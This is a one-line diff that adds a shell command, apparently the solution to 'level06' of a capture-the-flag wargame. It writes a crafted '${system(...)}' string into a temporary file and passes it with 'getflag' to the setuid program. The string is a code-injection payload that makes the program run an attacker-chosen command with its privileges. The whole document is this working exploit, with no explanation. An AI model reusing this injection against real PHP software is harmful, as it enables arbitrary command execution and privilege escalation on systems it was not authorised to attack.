@@ -1,0 +1,1 @@
+echo '[[ft {${system($ft_wtf)}}]]' > /tmp/lol && ./level06 /tmp/lol 'getflag'
